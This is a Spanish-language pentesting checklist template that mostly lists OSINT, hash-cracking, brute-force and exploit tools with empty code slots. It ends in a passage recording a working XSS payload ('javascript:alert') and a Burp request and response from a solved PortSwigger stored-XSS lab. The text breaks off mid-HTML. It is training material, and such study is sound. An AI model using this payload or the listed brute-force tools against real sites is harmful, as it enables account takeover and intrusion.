*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:

***

***

</details>

🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪

<details>

<summary>🕵️ INVESTIGACION OSINT ❌</summary>

**INVESTIGACION OSINT**

*   [ ] OSINT Framework👈 --------------------------------->[https://osintframework.com/](https://osintframework.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] Maltego👈 --------------------------------->[https://www.kali.org/tools/maltego/](https://www.kali.org/tools/maltego/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] Maltego👈 --------------------------------->[https://www.kali.org/tools/maltego/](https://www.kali.org/tools/maltego/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] Recon-ng👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] Recon-ng👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] theHarvester👈 --------------------------------->[https://www.kali.org/tools/theharvester/](https://www.kali.org/tools/theharvester/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] theHarvester👈 --------------------------------->[https://www.kali.org/tools/theharvester/](https://www.kali.org/tools/theharvester/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] GOOGLE DORKS👈 --------------------------------->[https://www.google.com/ ](https://www.google.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/google-dorking.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] GOOGLE DORKS👈 --------------------------------->[https://www.google.com/ ](https://www.google.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/google-dorking.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] GOOGLE DORKS👈 --------------------------------->[https://www.google.com/ ](https://www.google.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/google-dorking.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SHODAN👈 --------------------------------->[https://www.shodan.io/ ](https://www.shodan.io/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/shodan.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] OSRFrameworK👈 --------------------------------->[https://www.kali.org/tools/osrframework/](https://www.kali.org/tools/osrframework/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SN0INT👈 --------------------------------->[https://www.kali.org/tools/sn0int/](https://www.kali.org/tools/sn0int/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] OSINTGRAM👈 --------------------------------->[https://github.com/Datalux/Osintgram](https://github.com/Datalux/Osintgram)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] TWOSINT👈 --------------------------------->[https://github.com/falkensmz/tw1tter0s1nt](https://github.com/falkensmz/tw1tter0s1nt)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] INTELLIGENCE X FACEBOOK👈 --------------------------------->[https://intelx.io/tools?tab=facebook](https://intelx.io/tools?tab=facebook)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] INTELLIGENCE X PERSONAS👈 --------------------------------->[https://intelx.io/tools?tab=person](https://intelx.io/tools?tab=person)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] INTELLIGENCE X TELEFONOS👈 --------------------------------->[https://intelx.io/tools?tab=telephone](https://intelx.io/tools?tab=telephone)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] INTELLIGENCE X Ubicación 2 Mapa👈 --------------------------------->[https://intelx.io/tools?tab=location](https://intelx.io/tools?tab=location)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] INTELLIGENCE X IMAGEN👈 --------------------------------->[https://intelx.io/tools?tab=image](https://intelx.io/tools?tab=image)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] INTELLIGENCE X NOMBRE DE USUARIO👈 --------------------------------->[https://intelx.io/tools?tab=username](https://intelx.io/tools?tab=username)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] INTELLIGENCE X HASH INVERSA👈 --------------------------------->[https://intelx.io/tools?tab=hash](https://intelx.io/tools?tab=hash)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] INTELLIGENCE X ARCHIVOS👈 --------------------------------->[https://intelx.io/tools?tab=file](https://intelx.io/tools?tab=file)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] INTELLIGENCE X VIN VEHICULOS👈 --------------------------------->[https://intelx.io/tools?tab=vin](https://intelx.io/tools?tab=vin)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:

***

***

</details>

🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩

<details>

<summary>⛓️ HASHES Y DESENCRIPTADOS ❌</summary>

**HASHES Y DESENCRIPTADOS**

*   [ ] JOHN THE RIPPER👈 --------------------------------->[https://www.kali.org/tools/john/ ](https://www.kali.org/tools/john/)--->[PDF-TOOL](https://paimonhacking.gitbook.io/p4im0n\_h4cking/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/john-the-ripper)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] JOHN THE RIPPER👈 --------------------------------->[https://www.kali.org/tools/john/ ](https://www.kali.org/tools/john/)--->[PDF-TOOL](https://paimonhacking.gitbook.io/p4im0n\_h4cking/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/john-the-ripper)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] JOHN THE RIPPER👈 --------------------------------->[https://www.kali.org/tools/john/ ](https://www.kali.org/tools/john/)--->[PDF-TOOL](https://paimonhacking.gitbook.io/p4im0n\_h4cking/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/john-the-ripper)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] HASHCAT👈 --------------------------------->[https://www.kali.org/tools/hashcat/](https://www.kali.org/tools/hashcat/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] RAINBOWCRACK👈 --------------------------------->[https://www.kali.org/tools/rainbowcrack/](https://www.kali.org/tools/rainbowcrack/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] OPHCRACK👈 --------------------------------->[https://www.kali.org/tools/ophcrack/](https://www.kali.org/tools/ophcrack/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] CRACKSTATION👈 --------------------------------->[https://crackstation.net/](https://crackstation.net/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] AIRCRACK-NG👈 --------------------------------->[https://www.kali.org/tools/aircrack-ng/ ](https://www.kali.org/tools/aircrack-ng/)--->[PDF-TOOL](https://paimonhacking.gitbook.io/p4im0n\_h4cking/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/aircrack-ng-wireless-wi-fi-auditoria-y-fuerza-bruta-a-handshake)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] AIRCRACK-NG👈 --------------------------------->[https://www.kali.org/tools/aircrack-ng/ ](https://www.kali.org/tools/aircrack-ng/)--->[PDF-TOOL](https://paimonhacking.gitbook.io/p4im0n\_h4cking/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/aircrack-ng-wireless-wi-fi-auditoria-y-fuerza-bruta-a-handshake)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] CAIN Y ABEL👈 --------------------------------->[https://github.com/xchwarze/Cain](https://github.com/xchwarze/Cain)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] HYDRA👈 --------------------------------->[https://www.kali.org/tools/hydra/ ](https://www.kali.org/tools/hydra/)--->[PDF-TOOL](https://paimonhacking.gitbook.io/p4im0n\_h4cking/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/hydra-fuerza-bruta)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] HYDRA👈 --------------------------------->[https://www.kali.org/tools/hydra/ ](https://www.kali.org/tools/hydra/)--->[PDF-TOOL](https://paimonhacking.gitbook.io/p4im0n\_h4cking/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/hydra-fuerza-bruta)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] HYDRA👈 --------------------------------->[https://www.kali.org/tools/hydra/ ](https://www.kali.org/tools/hydra/)--->[PDF-TOOL](https://paimonhacking.gitbook.io/p4im0n\_h4cking/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/hydra-fuerza-bruta)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] MEDUSA👈 --------------------------------->[https://www.kali.org/tools/medusa/ ](https://www.kali.org/tools/medusa/)--->[PDF-TOOL](https://paimonhacking.gitbook.io/p4im0n\_h4cking/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/medusa)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] MEDUSA👈 --------------------------------->[https://www.kali.org/tools/medusa/ ](https://www.kali.org/tools/medusa/)--->[PDF-TOOL](https://paimonhacking.gitbook.io/p4im0n\_h4cking/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/medusa)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] DAVEGRO1👈 --------------------------------->[https://github.com/octomagon/davegrohl](https://github.com/octomagon/davegrohl)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] ElcomSoft Distributed Password Recovery👈 --------------------------------->[https://www.elcomsoft.es/edpr.html](https://www.elcomsoft.es/edpr.html)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] CRACK RAR👈 --------------------------------->[https://github.com/TermuxHackz/Crack-rar](https://github.com/TermuxHackz/Crack-rar)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] CRACK NINJA RAR👈 --------------------------------->[https://github.com/SHUR1K-N/RARNinja-RAR-Password-Cracking-Utility](https://github.com/SHUR1K-N/RARNinja-RAR-Password-Cracking-Utility)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] NCRACK👈 --------------------------------->[https://www.kali.org/tools/ncrack/](https://www.kali.org/tools/ncrack/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] CEWL WORDLIST👈 --------------------------------->[https://www.kali.org/tools/cewl/ ](https://www.kali.org/tools/cewl/)--->[PDF-TOOL](https://paimonhacking.gitbook.io/p4im0n\_h4cking/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/cewl)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] CRUNCH WORDLIST👈 --------------------------------->[https://www.kali.org/tools/crunch/ ](https://www.kali.org/tools/crunch/)--->[PDF-TOOL](https://paimonhacking.gitbook.io/p4im0n\_h4cking/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/crunch)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] P4Iwordlists👈 --------------------------------->[https://paimonhacking.gitbook.io/p4im0n\_h4cking/curso-hacking-con-python/generador-de-wordlist-para-fuerza-bruta-p4iwordlist.py-1.2v](https://paimonhacking.gitbook.io/p4im0n\_h4cking/curso-hacking-con-python/generador-de-wordlist-para-fuerza-bruta-p4iwordlist.py-1.2v)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] CYBERCHEF👈 --------------------------------->[https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] CYBERCHEF👈 --------------------------------->[https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] CYBERCHEF👈 --------------------------------->[https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] BASE64 DECODE👈 --------------------------------->[https://www.base64decode.org/](https://www.base64decode.org/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] BASE64 DECODE👈 --------------------------------->[https://www.base64decode.org/](https://www.base64decode.org/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:

***

***

</details>

🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨

<details>

<summary>💪 FUERZA BRUTA A LOGINS ❌</summary>

**FUERZA BRUTA A LOGINS**

*   [ ] HYDRA👈 --------------------------------->[https://www.kali.org/tools/hydra/ ](https://www.kali.org/tools/hydra/)--->[PDF-TOOL](https://paimonhacking.gitbook.io/p4im0n\_h4cking/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/hydra-fuerza-bruta)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] HYDRA👈 --------------------------------->[https://www.kali.org/tools/hydra/ ](https://www.kali.org/tools/hydra/)--->[PDF-TOOL](https://paimonhacking.gitbook.io/p4im0n\_h4cking/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/hydra-fuerza-bruta)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] HYDRA👈 --------------------------------->[https://www.kali.org/tools/hydra/ ](https://www.kali.org/tools/hydra/)--->[PDF-TOOL](https://paimonhacking.gitbook.io/p4im0n\_h4cking/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/hydra-fuerza-bruta)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] MEDUSA👈 --------------------------------->[https://www.kali.org/tools/medusa/ ](https://www.kali.org/tools/medusa/)--->[PDF-TOOL](https://paimonhacking.gitbook.io/p4im0n\_h4cking/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/medusa)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] MEDUSA👈 --------------------------------->[https://www.kali.org/tools/medusa/ ](https://www.kali.org/tools/medusa/)--->[PDF-TOOL](https://paimonhacking.gitbook.io/p4im0n\_h4cking/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/medusa)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] MEDUSA👈 --------------------------------->[https://www.kali.org/tools/medusa/ ](https://www.kali.org/tools/medusa/)--->[PDF-TOOL](https://paimonhacking.gitbook.io/p4im0n\_h4cking/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/medusa)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] NCRACK👈 --------------------------------->[https://www.kali.org/tools/ncrack/](https://www.kali.org/tools/ncrack/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] 161 ONESIXTYONE👈 --------------------------------->[https://www.kali.org/tools/onesixtyone/](https://www.kali.org/tools/onesixtyone/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] THC-PPTP-BRUTER👈 --------------------------------->[https://www.kali.org/tools/thc-pptp-bruter/](https://www.kali.org/tools/thc-pptp-bruter/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] BURP SUITE👈 --------------------------------->[https://portswigger.net/web-security ](https://portswigger.net/web-security)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/burpsuite.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] BURP SUITE👈 --------------------------------->[https://portswigger.net/web-security ](https://portswigger.net/web-security)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/burpsuite.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] BURP SUITE👈 --------------------------------->[https://portswigger.net/web-security ](https://portswigger.net/web-security)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/burpsuite.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] CRACKMAPEXEC👈 --------------------------------->[https://www.kali.org/tools/crackmapexec/](https://www.kali.org/tools/crackmapexec/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] CROWBAR RDP👈 --------------------------------->[https://www.kali.org/tools/crowbar/](https://www.kali.org/tools/crowbar/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] THE CRACKER PDF,ZIP,RAR,LOGIN👈 --------------------------------->[https://github.com/XDeadHackerX/The\_Cracker](https://github.com/XDeadHackerX/The\_Cracker)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] THC-HYDRA👈 --------------------------------->[https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] THC-HYDRA👈 --------------------------------->[https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] T14M4T scaneo de servicios en puertos y fuerza bruta automatizado👈 --------------------------------->[https://github.com/MS-WEB-BN/t14m4t](https://github.com/MS-WEB-BN/t14m4t)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] FACEBOOK-BRUTE-FORCE👈 --------------------------------->[https://github.com/likhonsible/Facebook-Brute-Force](https://github.com/likhonsible/Facebook-Brute-Force)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:

***

***

</details>

🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧

<details>

<summary>🛠️ SCRIPT DE EXPLOIT Y PAYLOADS ✔️</summary>

**SCRIPT DE EXPLOIT Y PAYLOADS**

*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] BURP SUITE👈 --------------------------------->[https://portswigger.net/web-security ](https://portswigger.net/web-security)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/burpsuite.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SEARCHSPLOIT👈 --------------------------------->[https://www.kali.org/tools/exploitdb/](https://www.kali.org/tools/exploitdb/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] EXPLOITDB👈 --------------------------------->[https://www.exploit-db.com/](https://www.exploit-db.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] GITHUB SEARCH👈 --------------------------------->[https://github.com/search](https://github.com/search)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] AWESOMEHACKING👈 --------------------------------->[https://awesomehacking.org/](https://awesomehacking.org/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] NVD VULNERABILITIES BASE👈 --------------------------------->[https://nvd.nist.gov/vuln](https://nvd.nist.gov/vuln)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] MSFVENOM PAYLOAD👈 --------------------------------->[https://www.kali.org/tools/metasploit-framework/ ](https://www.kali.org/tools/metasploit-framework/)--->[PDF-TOOL](https://paimonhacking.gitbook.io/p4im0n\_h4cking/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/msfvenom-generador-de-payloads)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] MSFPC PAYLOAD👈 --------------------------------->[https://www.kali.org/tools/msfpc/](https://www.kali.org/tools/msfpc/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] RAPID7 vulnerabilidades y exploits👈 --------------------------------->[https://www.rapid7.com/db/](https://www.rapid7.com/db/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] HACKTRICKS👈 --------------------------------->[https://book.hacktricks.xyz/v/es/welcome/readme](https://book.hacktricks.xyz/v/es/welcome/readme)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] HACKTOOL👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] HACKTOOL👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [x] NOSOTROS 👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    PROBANDO PAYLOADS Y FUNCIONO A LA PRIMERA:



    javascript:alert('P4IM0N-XSS')

    ```

    * CONCLUSION:FUNCIONO EL PAYLOAD A LA PRIMERA.
*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:

***

***

</details>

🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥

<details>

<summary>🤯 EXPLOTACION ✔️</summary>

**EXPLOTACION**

*   [x] BURP SUITE👈 --------------------------------->[https://portswigger.net/web-security ](https://portswigger.net/web-security)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/burpsuite.md)

    ```python
    REQUEST NOMRAL:



    POST /post/comment HTTP/2
    Host: 0a18009404d9f89a83c33ccd00040081.web-security-academy.net
    Cookie: session=wIYdf7PqerZCFYTDC3gD2AoGbBXyuRp0
    Content-Length: 166
    Cache-Control: max-age=0
    Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
    Sec-Ch-Ua-Mobile: ?0
    Sec-Ch-Ua-Platform: "Linux"
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
    Origin: https://0a18009404d9f89a83c33ccd00040081.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: navigate
    Sec-Fetch-User: ?1
    Sec-Fetch-Dest: document
    Referer: https://0a18009404d9f89a83c33ccd00040081.web-security-academy.net/post?postId=6
    Accept-Encoding: gzip, deflate, br
    Accept-Language: es-419,es;q=0.9,en;q=0.8
    Connection: close

    csrf=2UG950bIoDRrvtRmAELfwdnkH9DxybNV&postId=6&comment=TE+VOY+A+HACKEAR&name=PAIMON&email=P4IM0N%40hotmail.com&website=http%3A%2F%2Fp4imon-d-m-python.herokuapp.com%2F




    RESPONSE NORMAL:



    HTTP/2 200 OK
    Content-Type: text/html; charset=utf-8
    X-Frame-Options: SAMEORIGIN
    Content-Length: 5924

    <!DOCTYPE html>
    <html>
        <head>
            <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
            <link href=/resources/css/labsBlog.css rel=stylesheet>
            <title>Stored XSS into anchor href attribute with double quotes HTML-encoded</title>
        </head>
        <body>
            <script src="/resources/labheader/js/labHeader.js"></script>
            <div id="academyLabHeader">
                <section class='academyLabBanner is-solved'>
                    <div class=container>
                        <div class=logo></div>
                            <div class=title-container>
                                <h2>Stored XSS into anchor <code>href</code> attribute with double quotes HTML-encoded</h2>
                                <a class=link-back href='https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded'>
                                    Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                    <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                        <g>
                                            <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                            <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                        </g>
                                    </svg>
                                </a>
                            </div>
                            <div class='widgetcontainer-lab-status is-solved'>
                                <span>LAB</span>
                                <p>Solved</p>
                                <span class=lab-status-icon></span>
                            </div>
                        </div>
                    </div>
                </section>
                <section id=notification-labsolved class=notification-labsolved>
                    <div class=container>
                        <h4>Congratulations, you solved the lab!</h4>
                        <div>
                            <span>
                                Share your skills!
                            </span>
                            <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aStored+XSS+into+anchor+href+attribute+with+double+quotes+HTML-encoded%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2fcross-site-scripting%2fcontexts%2flab-href-attribute-double-quotes-html-encoded&related=WebSecAcademy,Burp_Suite'>
                        <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
                            <title>twitter-button</title>
                            <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
                        </svg>
                            </a>
                            <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fcross-site-scripting%2fcontexts%2flab-href-attribute-double-quotes-html-encoded'>
                        <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
                            <title>linkedin-button</title>
